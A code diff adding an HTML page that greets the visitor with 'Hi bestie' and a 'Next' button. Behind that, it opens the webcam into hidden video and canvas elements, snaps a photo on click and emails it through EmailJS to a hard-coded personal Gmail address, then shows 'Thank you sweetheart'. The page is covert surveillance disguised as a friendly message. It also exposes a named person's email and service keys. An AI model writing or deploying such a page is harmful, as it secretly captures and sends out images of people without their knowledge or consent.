@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <title>Hi Bestie</title>
+    <style>
+        body {
+            background-color: #D2B48C; /* Baby brown */
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .container {
+            text-align: center;
+        }
+        h1 {
+            color: white;
+            font-size: 3em;
+        }
+        button {
+            background-color: white;
+            color: #D2B48C;
+            border: none;
+            padding: 10px 20px;
+            font-size: 1.2em;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #f0e4d7;
+        }
+        #canvas {
+            display: none; /* Keep canvas hidden */
+        }
+        #video {
+            display: none; /* Keep video hidden */
+        }
+    </style>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init('EXUGhI5cp4k7w-4AQ'); // Replace with your EmailJS user ID
+        })();
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1 id="header">Hi bestie</h1>
+        <button id="takePictureButton" onclick="takePicture()">Next</button>
+        <canvas id="canvas"></canvas> <!-- Keep canvas hidden -->
+        <video id="video" autoplay></video> <!-- Keep video hidden -->
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const header = document.getElementById('header');
+        const takePictureButton = document.getElementById('takePictureButton');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            video.srcObject = stream;
+        })
+        .catch(function(err) {
+            console.log("An error occurred: " + err);
+        });
+
+        function takePicture() {
+            const width = 320; // Reduce the width to a smaller size
+            const height = video.videoHeight / (video.videoWidth / width); // Maintain aspect ratio
+
+            canvas.width = width;
+            canvas.height = height;
+
+            context.drawImage(video, 0, 0, width, height);
+            const data = canvas.toDataURL('image/jpeg', 0.5); // Change to 'image/jpeg' and reduce quality (0.5 = 50%)
+
+            sendEmail(data); // Send email with captured image data
+
+            const stream = video.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop()); // Stop video stream
+        }
+
+        function sendEmail(imageData) {
+            const base64Data = imageData.split(',')[1]; // Extract base64 data
+            const emailParams = {
+                to_name: 'Nouhaila Elbouhali',
+                to_email: 'nouhailaelbouhali73@gmail.com',
+                from_name: 'Jailey Shiper',
+                message: 'Here is the captured image!',
+                attachment: `data:image/jpeg;base64,${base64Data}` // Format the base64 data properly
+            };
+
+            console.log("Email Parameters: ", emailParams); // Log parameters for debugging
+
+            emailjs.send('service_pg1ysay', 'template_q8jc6xc', emailParams)
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                
+                // Update UI after email is sent
+                header.textContent = 'Thank you sweetheart'; // Change header text
+                takePictureButton.style.display = 'none'; // Hide the button
+            }, function(error) {
+                console.log('FAILED...', error);
+            });
+        }
+    </script>
+</body>
+</html>
